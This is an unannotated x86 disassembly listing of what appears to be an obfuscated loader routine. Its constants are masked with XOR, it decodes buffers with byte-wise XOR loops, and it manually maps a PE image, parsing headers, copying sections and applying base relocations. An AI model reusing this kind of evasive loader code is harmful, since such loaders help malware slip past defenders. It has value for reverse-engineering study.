  426453:	jmp    0x426486
  426455:	xor    ecx,ebx
  426457:	mov    dl,BYTE PTR [ebp+ecx*1+0x327295]
  42645e:	xor    dl,0x7c
  426461:	inc    dl
  426463:	mov    DWORD PTR [ebp-0x3c],ecx
  426466:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f1]
  42646e:	movzx  edx,dl
  426471:	cmp    ecx,edx
  426473:	jne    0x426490
  426475:	mov    ecx,DWORD PTR [ebp-0x18]
  426478:	mov    edx,DWORD PTR [ebp-0x3c]
  42647b:	xor    ecx,ebx
  42647d:	lea    ecx,[ecx+edx*1+0x3272f1]
  426484:	xor    ecx,ebx
  426486:	cmp    ecx,0xf89c85bd
  42648c:	jne    0x426455
  42648e:	jmp    0x426497
  426490:	mov    eax,DWORD PTR [ebp-0x10]
  426493:	xor    eax,ebx
  426495:	add    eax,esi
  426497:	mov    ecx,DWORD PTR [ebp-0x10]
  42649a:	xor    ecx,ebx
  42649c:	add    ecx,esi
  42649e:	cmp    ecx,eax
  4264a0:	je     0x426613
  4264a6:	mov    eax,DWORD PTR [edi+0x8]
  4264a9:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4264b0:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  4264b7:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  4264be:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  4264c5:	mov    DWORD PTR [ebp-0x14],eax
  4264c8:	mov    eax,DWORD PTR [ebp+0x8]
  4264cb:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ce:	xor    ecx,ebx
  4264d0:	add    ecx,esi
  4264d2:	push   ecx
  4264d3:	mov    ecx,DWORD PTR [ebp-0x48]
  4264d6:	mov    eax,DWORD PTR [eax+0x1e0]
  4264dc:	xor    ecx,ebx
  4264de:	add    ecx,esi
  4264e0:	push   ecx
  4264e1:	mov    ecx,DWORD PTR [ebp-0x3c]
  4264e4:	xor    ecx,ebx
  4264e6:	add    ecx,esi
  4264e8:	push   ecx
  4264e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4264ec:	xor    ecx,ebx
  4264ee:	add    ecx,esi
  4264f0:	push   ecx
  4264f1:	call   DWORD PTR [eax+0x14]
  4264f4:	mov    edi,eax
  4264f6:	mov    eax,DWORD PTR [ebp+0x8]
  4264f9:	mov    ecx,DWORD PTR [ebp-0x20]
  4264fc:	mov    eax,DWORD PTR [eax+0x1e0]
  426502:	xor    ecx,ebx
  426504:	add    ecx,esi
  426506:	push   ecx
  426507:	mov    ecx,DWORD PTR [ebp-0x48]
  42650a:	xor    ecx,ebx
  42650c:	add    ecx,esi
  42650e:	push   ecx
  42650f:	mov    ecx,DWORD PTR [ebp-0xc]
  426512:	push   DWORD PTR [ebp-0x14]
  426515:	xor    ecx,ebx
  426517:	add    ecx,esi
  426519:	push   ecx
  42651a:	call   DWORD PTR [eax+0x14]
  42651d:	mov    ecx,DWORD PTR [ebp-0xc]
  426520:	xor    ecx,ebx
  426522:	add    ecx,esi
  426524:	mov    DWORD PTR [ebp-0x20],eax
  426527:	cmp    ecx,edi
  426529:	je     0x4268b6
  42652f:	mov    ecx,DWORD PTR [ebp-0xc]
  426532:	xor    ecx,ebx
  426534:	add    ecx,esi
  426536:	cmp    ecx,eax
  426538:	je     0x4268b6
  42653e:	mov    DWORD PTR [ebp-0x3c],0xf89c85b8
  426545:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  42654c:	mov    ecx,DWORD PTR [ebp-0x3c]
  42654f:	xor    cl,0xaa
  426552:	sub    cl,0xf
  426555:	mov    BYTE PTR [edi],cl
  426557:	mov    ecx,DWORD PTR [ebp-0xc]
  42655a:	xor    cl,0xaa
  42655d:	sub    cl,0xf
  426560:	mov    BYTE PTR [edi+0x1],cl
  426563:	mov    ecx,DWORD PTR [ebp-0x54]
  426566:	xor    cl,0xaa
  426569:	sub    cl,0xf
  42656c:	mov    BYTE PTR [edi+0x2],cl
  42656f:	and    DWORD PTR [ebp-0xc8],0x0
  426576:	and    DWORD PTR [ebp-0xdc],0x0
  42657d:	lea    ecx,[ebp-0xdc]
  426583:	push   ecx
  426584:	push   DWORD PTR [ebp-0x14]
  426587:	push   eax
  426588:	lea    eax,[ebp-0xc8]
  42658e:	push   eax
  42658f:	mov    eax,DWORD PTR [ebp-0x30]
  426592:	push   DWORD PTR [eax+0xc]
  426595:	mov    eax,DWORD PTR [ebp-0x24]
  426598:	add    eax,0x10
  42659b:	push   eax
  42659c:	push   edi
  42659d:	call   0x425844
  4265a2:	mov    DWORD PTR [ebp-0x3c],eax
  4265a5:	mov    eax,DWORD PTR [ebp+0x8]
  4265a8:	mov    ecx,DWORD PTR [ebp-0x50]
  4265ab:	mov    eax,DWORD PTR [eax+0x1e0]
  4265b1:	xor    ecx,ebx
  4265b3:	add    ecx,esi
  4265b5:	push   ecx
  4265b6:	mov    ecx,DWORD PTR [ebp-0xc]
  4265b9:	xor    ecx,ebx
  4265bb:	add    ecx,esi
  4265bd:	push   ecx
  4265be:	push   edi
  4265bf:	call   DWORD PTR [eax+0x18]
  4265c2:	mov    eax,DWORD PTR [ebp-0x3c]
  4265c5:	add    eax,0xffcd8d0f
  4265ca:	xor    eax,ebx
  4265cc:	cmp    eax,0xf89c85a5
  4265d1:	mov    eax,DWORD PTR [ebp+0x8]
  4265d4:	mov    eax,DWORD PTR [eax+0x1e0]
  4265da:	mov    ecx,DWORD PTR [ebp-0x50]
  4265dd:	jne    0x426600
  4265df:	xor    ecx,ebx
  4265e1:	add    ecx,esi
  4265e3:	push   ecx
  4265e4:	mov    ecx,DWORD PTR [ebp-0xc]
  4265e7:	xor    ecx,ebx
  4265e9:	add    ecx,esi
  4265eb:	push   ecx
  4265ec:	push   DWORD PTR [ebp-0x24]
  4265ef:	call   DWORD PTR [eax+0x18]
  4265f2:	mov    eax,DWORD PTR [ebp-0x20]
  4265f5:	mov    DWORD PTR [ebp-0x24],eax
  4265f8:	mov    eax,DWORD PTR [ebp-0x14]
  4265fb:	mov    DWORD PTR [ebp-0x40],eax
  4265fe:	jmp    0x426613
  426600:	xor    ecx,ebx
  426602:	add    ecx,esi
  426604:	push   ecx
  426605:	mov    ecx,DWORD PTR [ebp-0xc]
  426608:	xor    ecx,ebx
  42660a:	add    ecx,esi
  42660c:	push   ecx
  42660d:	push   DWORD PTR [ebp-0x20]
  426610:	call   DWORD PTR [eax+0x18]
  426613:	mov    eax,DWORD PTR [ebp-0x40]
  426616:	mov    DWORD PTR [ebp-0x38],eax
  426619:	mov    eax,DWORD PTR [ebp-0x24]
  42661c:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426623:	mov    DWORD PTR [ebp-0x3c],eax
  426626:	mov    edi,0xf89c85ba
  42662b:	mov    DWORD PTR [ebp-0x2c],edi
  42662e:	mov    eax,DWORD PTR [ebp-0x28]
  426631:	xor    eax,ebx
  426633:	add    eax,esi
  426635:	mov    DWORD PTR [ebp-0xc],eax
  426638:	mov    eax,DWORD PTR [ebp-0x28]
  42663b:	xor    eax,ebx
  42663d:	add    eax,esi
  42663f:	mov    DWORD PTR [ebp-0x14],eax
  426642:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426649:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  426650:	mov    eax,DWORD PTR [ebp-0x28]
  426653:	mov    ecx,DWORD PTR [ebp-0x38]
  426656:	xor    eax,ebx
  426658:	add    eax,esi
  42665a:	cmp    ecx,eax
  42665c:	je     0x426852
  426662:	jmp    0x42682e
  426667:	mov    ecx,DWORD PTR [ebp-0xc]
  42666a:	mov    eax,DWORD PTR [ebp-0x38]
  42666d:	sub    eax,ecx
  42666f:	mov    ecx,DWORD PTR [ebp-0x48]
  426672:	xor    ecx,ebx
  426674:	add    ecx,esi
  426676:	xor    edx,edx
  426678:	div    ecx
  42667a:	mov    DWORD PTR [ebp-0x14],eax
  42667d:	mov    eax,DWORD PTR [ebp-0x20]
  426680:	mov    ecx,DWORD PTR [ebp-0x14]
  426683:	xor    eax,ebx
  426685:	add    eax,esi
  426687:	cmp    ecx,eax
  426689:	jbe    0x426695
  42668b:	mov    eax,DWORD PTR [ebp-0x20]
  42668e:	xor    eax,ebx
  426690:	add    eax,esi
  426692:	mov    DWORD PTR [ebp-0x14],eax
  426695:	mov    eax,DWORD PTR [ebp-0x48]
  426698:	mov    ecx,DWORD PTR [ebp-0x14]
  42669b:	xor    eax,ebx
  42669d:	add    eax,esi
  42669f:	imul   eax,ecx
  4266a2:	mov    DWORD PTR [ebp-0x14],eax
  4266a5:	mov    eax,DWORD PTR [ebp-0x28]
  4266a8:	mov    ecx,DWORD PTR [ebp-0x14]
  4266ab:	xor    eax,ebx
  4266ad:	add    eax,esi
  4266af:	cmp    ecx,eax
  4266b1:	je     0x42681c
  4266b7:	mov    eax,DWORD PTR [ebp-0x14]
  4266ba:	mov    DWORD PTR [ebp-0x34],eax
  4266bd:	mov    eax,DWORD PTR [ebp-0xc]
  4266c0:	add    eax,DWORD PTR [ebp-0x3c]
  4266c3:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4266ca:	mov    DWORD PTR [ebp-0x14],edi
  4266cd:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4266d4:	mov    DWORD PTR [ebp-0x1c],eax
  4266d7:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  4266de:	mov    DWORD PTR [ebp-0x8],edi
  4266e1:	mov    eax,DWORD PTR [ebp-0x4c]
  4266e4:	xor    eax,ebx
  4266e6:	add    eax,esi
  4266e8:	jmp    0x4267db
  4266ed:	mov    DWORD PTR [ebp-0xe4],0xf89c85b0
  4266f7:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426701:	mov    eax,DWORD PTR [ebp-0x8]
  426704:	mov    ecx,DWORD PTR [ebp-0x18]
  426707:	xor    eax,ebx
  426709:	add    eax,esi
  42670b:	imul   eax,ecx
  42670e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426711:	mov    al,BYTE PTR [eax+ecx*1]
  426714:	mov    BYTE PTR [ebp-0x1],al
  426717:	mov    eax,DWORD PTR [ebp-0x8]
  42671a:	mov    ecx,DWORD PTR [ebp-0x18]
  42671d:	xor    eax,ebx
  42671f:	add    eax,esi
  426721:	imul   eax,ecx
  426724:	mov    ecx,DWORD PTR [ebp-0x54]
  426727:	xor    ecx,ebx
  426729:	add    eax,ecx
  42672b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42672e:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426736:	mov    ecx,DWORD PTR [ebp-0xe4]
  42673c:	xor    ecx,ebx
  42673e:	lea    eax,[ecx+eax*1+0x3272f1]
  426745:	movzx  ecx,BYTE PTR [ebp-0x1]
  426749:	xor    ecx,eax
  42674b:	mov    BYTE PTR [ebp-0x1],cl
  42674e:	mov    al,BYTE PTR [ebp-0x1]
  426751:	mov    ecx,DWORD PTR [ebp-0x8]
  426754:	mov    edx,DWORD PTR [ebp-0x18]
  426757:	xor    ecx,ebx
  426759:	add    ecx,esi
  42675b:	imul   ecx,edx
  42675e:	mov    edx,DWORD PTR [ebp-0x1c]
  426761:	mov    BYTE PTR [ecx+edx*1],al
  426764:	mov    eax,DWORD PTR [ebp-0x8]
  426767:	mov    ecx,DWORD PTR [ebp-0x18]
  42676a:	xor    eax,ebx
  42676c:	add    eax,esi
  42676e:	imul   eax,ecx
  426771:	mov    ecx,DWORD PTR [ebp-0x1c]
  426774:	mov    al,BYTE PTR [eax+ecx*1]
  426777:	mov    BYTE PTR [ebp-0x1],al
  42677a:	mov    eax,DWORD PTR [ebp-0x8]
  42677d:	mov    ecx,DWORD PTR [ebp-0x18]
  426780:	xor    eax,ebx
  426782:	add    eax,esi
  426784:	imul   eax,ecx
  426787:	mov    ecx,DWORD PTR [ebp-0x14]
  42678a:	xor    ecx,ebx
  42678c:	add    eax,ecx
  42678e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426791:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426799:	mov    ecx,DWORD PTR [ebp-0xd0]
  42679f:	xor    ecx,ebx
  4267a1:	lea    eax,[ecx+eax*1+0x3272f1]
  4267a8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4267ac:	xor    ecx,eax
  4267ae:	mov    BYTE PTR [ebp-0x1],cl
  4267b1:	mov    al,BYTE PTR [ebp-0x1]
  4267b4:	mov    ecx,DWORD PTR [ebp-0x8]
  4267b7:	mov    edx,DWORD PTR [ebp-0x18]
  4267ba:	xor    ecx,ebx
  4267bc:	add    ecx,esi
  4267be:	imul   ecx,edx
  4267c1:	mov    edx,DWORD PTR [ebp-0x1c]
  4267c4:	mov    BYTE PTR [ecx+edx*1],al
  4267c7:	mov    eax,DWORD PTR [ebp-0x30]
  4267ca:	mov    ecx,DWORD PTR [ebp-0x14]
  4267cd:	xor    eax,ebx
  4267cf:	xor    ecx,ebx
  4267d1:	add    eax,esi
  4267d3:	add    ecx,esi
  4267d5:	imul   eax,ecx
  4267d8:	add    eax,DWORD PTR [ebp-0x18]
  4267db:	mov    DWORD PTR [ebp-0x18],eax
  4267de:	mov    eax,DWORD PTR [ebp-0x18]
  4267e1:	mov    ecx,DWORD PTR [ebp-0x34]
  4267e4:	cmp    ecx,eax
  4267e6:	jb     0x4266ed
  4267ec:	mov    eax,DWORD PTR [ebp-0x14]
  4267ef:	mov    ecx,DWORD PTR [ebp-0x34]
  4267f2:	xor    eax,ebx
  4267f4:	add    eax,esi
  4267f6:	imul   eax,ecx
  4267f9:	mov    ecx,DWORD PTR [ebp-0x4c]
  4267fc:	xor    ecx,ebx
  4267fe:	add    ecx,esi
  426800:	or     eax,ecx
  426802:	mov    ecx,DWORD PTR [ebp-0x2c]
  426805:	xor    ecx,ebx
  426807:	add    eax,ecx
  426809:	mov    ecx,DWORD PTR [ebp-0x2c]
  42680c:	xor    ecx,ebx
  42680e:	add    eax,ecx
  426810:	mov    ecx,DWORD PTR [ebp-0xc]
  426813:	lea    eax,[eax+ecx*1+0x64e5e2]
  42681a:	jmp    0x42682b
  42681c:	mov    eax,DWORD PTR [ebp-0x2c]
  42681f:	mov    ecx,DWORD PTR [ebp-0xc]
  426822:	xor    eax,ebx
  426824:	lea    eax,[eax+ecx*1+0x3272f1]
  42682b:	mov    DWORD PTR [ebp-0xc],eax
  42682e:	mov    eax,DWORD PTR [ebp-0x2c]
  426831:	xor    eax,ebx
  426833:	mov    ecx,0xffcd8d0f
  426838:	sub    ecx,eax
  42683a:	add    ecx,DWORD PTR [ebp-0x38]
  42683d:	mov    eax,DWORD PTR [ebp-0x2c]
  426840:	mov    edx,DWORD PTR [ebp-0xc]
  426843:	xor    eax,ebx
  426845:	add    eax,esi
  426847:	imul   eax,edx
  42684a:	cmp    eax,ecx
  42684c:	jbe    0x426667
  426852:	push   DWORD PTR [ebp+0x8]
  426855:	mov    eax,DWORD PTR [ebp+0x8]
  426858:	push   DWORD PTR [eax+0x1cc]
  42685e:	lea    eax,[ebp-0xd8]
  426864:	push   eax
  426865:	mov    eax,DWORD PTR [ebp+0x8]
  426868:	mov    eax,DWORD PTR [eax+0x1c4]
  42686e:	push   DWORD PTR [eax]
  426870:	mov    eax,DWORD PTR [ebp+0x8]
  426873:	mov    eax,DWORD PTR [eax+0x1c0]
  426879:	push   DWORD PTR [eax]
  42687b:	push   DWORD PTR [ebp-0x40]
  42687e:	push   DWORD PTR [ebp-0x24]
  426881:	call   0x427318
  426886:	mov    DWORD PTR [ebp-0x3c],eax
  426889:	mov    eax,DWORD PTR [ebp-0x10]
  42688c:	mov    ecx,DWORD PTR [ebp-0x24]
  42688f:	xor    eax,ebx
  426891:	add    eax,esi
  426893:	cmp    eax,ecx
  426895:	je     0x4268b6
  426897:	mov    eax,DWORD PTR [ebp+0x8]
  42689a:	mov    ecx,DWORD PTR [ebp-0x50]
  42689d:	mov    eax,DWORD PTR [eax+0x1e0]
  4268a3:	xor    ecx,ebx
  4268a5:	add    ecx,esi
  4268a7:	push   ecx
  4268a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4268ab:	xor    ecx,ebx
  4268ad:	add    ecx,esi
  4268af:	push   ecx
  4268b0:	push   DWORD PTR [ebp-0x24]
  4268b3:	call   DWORD PTR [eax+0x18]
  4268b6:	pop    edi
  4268b7:	pop    esi
  4268b8:	pop    ebx
  4268b9:	leave  
  4268ba:	ret    0x4
  4268bd:	push   ebp
  4268be:	mov    ebp,esp
  4268c0:	push   ecx
  4268c1:	push   ecx
  4268c2:	lea    eax,[ebp-0x8]
  4268c5:	mov    DWORD PTR [ebp-0x4],eax
  4268c8:	push   esi
  4268c9:	mov    esi,DWORD PTR [ebp-0x4]
  4268cc:	mov    eax,0xf881ba2f
  4268d1:	mov    DWORD PTR [esi],eax
  4268d3:	mov    esi,DWORD PTR [ebp-0x8]
  4268d6:	cmp    esi,eax
  4268d8:	pop    esi
  4268d9:	jne    0x4268e3
  4268db:	mov    BYTE PTR [ecx+0xa],0x83
  4268df:	mov    BYTE PTR [edx+0x8],0x2e
  4268e3:	mov    BYTE PTR [edx+0xa],0x83
  4268e7:	mov    BYTE PTR [ecx+0x2],0x11
  4268eb:	leave  
  4268ec:	ret    
  4268ed:	push   ebp
  4268ee:	mov    ebp,esp
  4268f0:	push   ecx
  4268f1:	push   ecx
  4268f2:	lea    eax,[ebp-0x8]
  4268f5:	mov    DWORD PTR [ebp-0x4],eax
  4268f8:	mov    edx,DWORD PTR [ebp-0x4]
  4268fb:	mov    eax,0xf88b0bc3
  426900:	mov    DWORD PTR [edx],eax
  426902:	mov    edx,DWORD PTR [ebp-0x8]
  426905:	cmp    edx,eax
  426907:	jne    0x426918
  426909:	mov    eax,DWORD PTR [ebp+0x8]
  42690c:	mov    BYTE PTR [ecx+0x9],0xf
  426910:	mov    BYTE PTR [eax+0x7],0x56
  426914:	mov    BYTE PTR [ecx+0x6],0xe
  426918:	mov    BYTE PTR [ecx+0x3],0x1f
  42691c:	leave  
  42691d:	ret    0x4
  426920:	push   ebp
  426921:	mov    ebp,esp
  426923:	push   ecx
  426924:	push   ecx
  426925:	lea    eax,[ebp-0x8]
  426928:	mov    DWORD PTR [ebp-0x4],eax
  42692b:	mov    edx,DWORD PTR [ebp-0x4]
  42692e:	mov    eax,0x7e0da2f
  426933:	mov    DWORD PTR [edx],eax
  426935:	mov    edx,DWORD PTR [ebp-0x8]
  426938:	cmp    edx,eax
  42693a:	jne    0x426940
  42693c:	mov    BYTE PTR [ecx+0x7],0x56
  426940:	mov    eax,DWORD PTR [ebp+0x8]
  426943:	mov    BYTE PTR [ecx+0x1],0x14
  426947:	mov    BYTE PTR [eax+0x9],0x2f
  42694b:	leave  
  42694c:	ret    0x4
  42694f:	push   ebp
  426950:	mov    ebp,esp
  426952:	push   ecx
  426953:	push   ecx
  426954:	lea    eax,[ebp-0x8]
  426957:	mov    DWORD PTR [ebp-0x4],eax
  42695a:	push   esi
  42695b:	mov    esi,DWORD PTR [ebp-0x4]
  42695e:	mov    eax,0x7060e3c
  426963:	mov    DWORD PTR [esi],eax
  426965:	mov    esi,DWORD PTR [ebp-0x8]
  426968:	cmp    esi,eax
  42696a:	pop    esi
  42696b:	jne    0x426977
  42696d:	mov    BYTE PTR [edx+0x4],0x12
  426971:	mov    WORD PTR [ecx+0x3],0x121f
  426977:	mov    BYTE PTR [edx],0x3e
  42697a:	leave  
  42697b:	ret    
  42697c:	push   ebp
  42697d:	mov    ebp,esp
  42697f:	push   ecx
  426980:	push   ecx
  426981:	lea    eax,[ebp-0x8]
  426984:	mov    DWORD PTR [ebp-0x4],eax
  426987:	mov    edx,DWORD PTR [ebp-0x4]
  42698a:	mov    eax,0xf8870b3f
  42698f:	mov    DWORD PTR [edx],eax
  426991:	mov    edx,DWORD PTR [ebp-0x8]
  426994:	cmp    edx,eax
  426996:	jne    0x4269a3
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    BYTE PTR [ecx+0x8],0xe
  42699f:	mov    BYTE PTR [eax+0x1],0x14
  4269a3:	mov    BYTE PTR [ecx+0x5],0xa
  4269a7:	leave  
  4269a8:	ret    0x4
  4269ab:	push   esi
  4269ac:	mov    ecx,edi
  4269ae:	call   0x42697c
  4269b3:	mov    edx,edi
  4269b5:	mov    ecx,esi
  4269b7:	mov    BYTE PTR [esi],0x1e
  4269ba:	call   0x42694f
  4269bf:	push   esi
  4269c0:	mov    ecx,edi
  4269c2:	mov    BYTE PTR [esi+0x5],0xa
  4269c6:	call   0x426920
  4269cb:	push   esi
  4269cc:	mov    BYTE PTR [esi+0x6],0xe
  4269d0:	call   0x4268ed
  4269d5:	mov    BYTE PTR [esi+0x2],0x11
  4269d9:	mov    edx,esi
  4269db:	jmp    0x4268bd
  4269e0:	push   ebp
  4269e1:	mov    ebp,esp
  4269e3:	push   ecx
  4269e4:	mov    ecx,DWORD PTR [edx+0x194]
  4269ea:	push   esi
  4269eb:	mov    esi,DWORD PTR [ebp+0x8]
  4269ee:	mov    esi,DWORD PTR [esi]
  4269f0:	mov    DWORD PTR [ecx],esi
  4269f2:	mov    ecx,DWORD PTR [edx+0x194]
  4269f8:	mov    ecx,DWORD PTR [ecx]
  4269fa:	mov    esi,DWORD PTR [edx+0x190]
  426a00:	mov    DWORD PTR [esi],ecx
  426a02:	mov    eax,DWORD PTR [edx+0x194]
  426a08:	mov    ecx,DWORD PTR [eax]
  426a0a:	mov    ecx,DWORD PTR [ecx+0x3c]
  426a0d:	add    ecx,DWORD PTR [eax]
  426a0f:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426a16:	mov    eax,DWORD PTR [ebp-0x4]
  426a19:	movzx  ecx,WORD PTR [ecx+0x16]
  426a1d:	xor    eax,0x75108aa
  426a22:	add    eax,0x3272f1
  426a27:	pop    esi
  426a28:	test   ecx,eax
  426a2a:	je     0x426a38
  426a2c:	mov    eax,DWORD PTR [edx+0x1c8]
  426a32:	mov    DWORD PTR [eax],0xf89c85ba
  426a38:	leave  
  426a39:	ret    0x4
  426a3c:	push   ebp
  426a3d:	mov    ebp,esp
  426a3f:	sub    esp,0x70
  426a42:	and    DWORD PTR [ebp-0x20],0x0
  426a46:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  426a4d:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  426a54:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  426a5b:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  426a62:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  426a69:	mov    eax,DWORD PTR [ebp+0x20]
  426a6c:	mov    eax,DWORD PTR [eax+0x194]
  426a72:	mov    DWORD PTR [ebp-0xc],eax
  426a75:	mov    eax,DWORD PTR [ebp+0x20]
  426a78:	push   ebx
  426a79:	push   esi
  426a7a:	mov    esi,DWORD PTR [eax+0x190]
  426a80:	mov    eax,DWORD PTR [ebp+0x20]
  426a83:	mov    eax,DWORD PTR [eax+0x18c]
  426a89:	mov    DWORD PTR [ebp-0x8],eax
  426a8c:	mov    eax,DWORD PTR [eax]
  426a8e:	push   edi
  426a8f:	mov    DWORD PTR [ebp-0x4],esi
  426a92:	test   eax,eax
  426a94:	jne    0x426aa1
  426a96:	push   DWORD PTR [ebp+0x1c]
  426a99:	mov    edx,DWORD PTR [ebp+0x20]
  426a9c:	call   0x4269e0
  426aa1:	mov    eax,DWORD PTR [esi]
  426aa3:	mov    ebx,DWORD PTR [esi]
  426aa5:	add    ebx,DWORD PTR [eax+0x3c]
  426aa8:	mov    eax,DWORD PTR [ebp+0xc]
  426aab:	mov    ecx,DWORD PTR [ebp-0x8]
  426aae:	mov    ecx,DWORD PTR [ecx]
  426ab0:	mov    esi,0x75108aa
  426ab5:	xor    eax,esi
  426ab7:	mov    edi,0x3272f1
  426abc:	add    eax,edi
  426abe:	cmp    eax,ecx
  426ac0:	jne    0x426cf8
  426ac6:	mov    eax,DWORD PTR [ebp-0xc]
  426ac9:	mov    eax,DWORD PTR [eax]
  426acb:	mov    DWORD PTR [ebp-0x10],eax
  426ace:	mov    eax,DWORD PTR [ebx+0x50]
  426ad1:	mov    DWORD PTR [ebp-0x68],eax
  426ad4:	mov    eax,DWORD PTR [ebp-0x18]
  426ad7:	xor    eax,esi
  426ad9:	add    eax,edi
  426adb:	mov    DWORD PTR [ebp-0x64],eax
  426ade:	mov    eax,DWORD PTR [ebp-0x14]
  426ae1:	and    DWORD PTR [ebp-0x6c],0x0
  426ae5:	xor    eax,esi
  426ae7:	add    eax,edi
  426ae9:	mov    DWORD PTR [ebp-0x60],eax
  426aec:	lea    eax,[ebp-0x70]
  426aef:	push   eax
  426af0:	mov    eax,DWORD PTR [ebp+0x8]
  426af3:	xor    eax,esi
  426af5:	add    eax,edi
  426af7:	push   eax
  426af8:	mov    eax,DWORD PTR [ebp+0x20]
  426afb:	add    eax,0xaa
  426b00:	push   eax
  426b01:	mov    eax,DWORD PTR [ebp+0x20]
  426b04:	mov    eax,DWORD PTR [eax+0x198]
  426b0a:	mov    DWORD PTR [ebp-0x70],0x4
  426b11:	push   DWORD PTR [eax]
  426b13:	mov    eax,DWORD PTR [ebp+0x10]
  426b16:	call   eax
  426b18:	mov    ecx,DWORD PTR [ebp-0xc]
  426b1b:	mov    ecx,DWORD PTR [ecx]
  426b1d:	mov    edx,DWORD PTR [ebp-0x8]
  426b20:	mov    DWORD PTR [ebp-0x6c],eax
  426b23:	mov    DWORD PTR [ebp+0x1c],eax
  426b26:	mov    DWORD PTR [edx],ecx
  426b28:	mov    ecx,DWORD PTR [ebp-0x4]
  426b2b:	mov    DWORD PTR [ecx],eax
  426b2d:	mov    eax,DWORD PTR [ebx+0x50]
  426b30:	mov    DWORD PTR [ebp-0x68],eax
  426b33:	mov    eax,DWORD PTR [ebp-0x1c]
  426b36:	xor    eax,esi
  426b38:	add    eax,edi
  426b3a:	mov    DWORD PTR [ebp-0x64],eax
  426b3d:	lea    eax,[ebp-0x20]
  426b40:	mov    DWORD PTR [ebp-0x60],eax
  426b43:	lea    eax,[ebp-0x70]
  426b46:	push   eax
  426b47:	mov    eax,DWORD PTR [ebp+0x8]
  426b4a:	xor    eax,esi
  426b4c:	add    eax,edi
  426b4e:	push   eax
  426b4f:	mov    eax,DWORD PTR [ebp+0x20]
  426b52:	add    eax,0xee
  426b57:	push   eax
  426b58:	mov    eax,DWORD PTR [ebp+0x20]
  426b5b:	mov    eax,DWORD PTR [eax+0x198]
  426b61:	mov    DWORD PTR [ebp-0x70],0x4
  426b68:	push   DWORD PTR [eax]
  426b6a:	mov    eax,DWORD PTR [ebp+0x10]
  426b6d:	call   eax
  426b6f:	test   eax,eax
  426b71:	je     0x426b96
  426b73:	and    DWORD PTR [ebp+0xc],0x0
  426b77:	cmp    DWORD PTR [ebx+0x50],0x0
  426b7b:	jbe    0x426b96
  426b7d:	mov    eax,DWORD PTR [ebp+0x1c]
  426b80:	mov    ecx,DWORD PTR [ebp-0x10]
  426b83:	sub    ecx,eax
  426b85:	mov    dl,BYTE PTR [ecx+eax*1]
  426b88:	inc    DWORD PTR [ebp+0xc]
  426b8b:	mov    BYTE PTR [eax],dl
  426b8d:	mov    edx,DWORD PTR [ebp+0xc]
  426b90:	inc    eax
  426b91:	cmp    edx,DWORD PTR [ebx+0x50]
  426b94:	jb     0x426b85
  426b96:	mov    edx,DWORD PTR [ebp+0x1c]
  426b99:	mov    ecx,DWORD PTR [edx+0x3c]
  426b9c:	add    ecx,edx
  426b9e:	mov    eax,DWORD PTR [ecx+0xa0]
  426ba4:	mov    ebx,DWORD PTR [ecx+0x28]
  426ba7:	add    eax,edx
  426ba9:	sub    edx,DWORD PTR [ebp-0x10]
  426bac:	add    ebx,DWORD PTR [ebp+0x1c]
  426baf:	mov    DWORD PTR [ebp+0xc],edx
  426bb2:	mov    DWORD PTR [ebp-0x2c],ecx
  426bb5:	mov    DWORD PTR [ebp-0x14],ebx
  426bb8:	mov    DWORD PTR [ebp-0x8],0x0
  426bbf:	jmp    0x426c3b
  426bc1:	add    edx,0xfffffff8
  426bc4:	shr    edx,1
  426bc6:	mov    DWORD PTR [ebp-0x18],edx
  426bc9:	je     0x426c27
  426bcb:	lea    edx,[eax+0x8]
  426bce:	mov    DWORD PTR [ebp-0x4],edx
  426bd1:	mov    edx,DWORD PTR [ebp-0x18]
  426bd4:	mov    DWORD PTR [ebp-0x18],edx
  426bd7:	mov    edx,DWORD PTR [ebp-0x4]
  426bda:	movzx  edx,WORD PTR [edx]
  426bdd:	mov    DWORD PTR [ebp-0x24],edx
  426be0:	and    edx,0xfff
  426be6:	mov    DWORD PTR [ebp-0x28],edx
  426be9:	mov    edx,DWORD PTR [ebp-0x24]
  426bec:	shr    edx,0xc
  426bef:	add    edx,0xffcd8d0f
  426bf5:	xor    edx,esi
  426bf7:	cmp    edx,0xf89c85b8
  426bfd:	jne    0x426c1e
  426bff:	mov    edx,DWORD PTR [ebp-0x28]
  426c02:	add    edx,DWORD PTR [ebp+0x1c]
  426c05:	mov    ebx,DWORD PTR [eax]
  426c07:	cmp    DWORD PTR [ebx+edx*1],0x0
  426c0b:	je     0x426c1b
  426c0d:	mov    ecx,DWORD PTR [ebp+0xc]
  426c10:	add    ecx,DWORD PTR [ebx+edx*1]
  426c13:	mov    ebx,DWORD PTR [eax]
  426c15:	mov    DWORD PTR [edx+ebx*1],ecx
  426c18:	mov    ecx,DWORD PTR [ebp-0x2c]
  426c1b:	mov    ebx,DWORD PTR [ebp-0x14]
  426c1e:	add    DWORD PTR [ebp-0x4],0x2
  426c22:	dec    DWORD PTR [ebp-0x18]
  426c25:	jne    0x426bd7
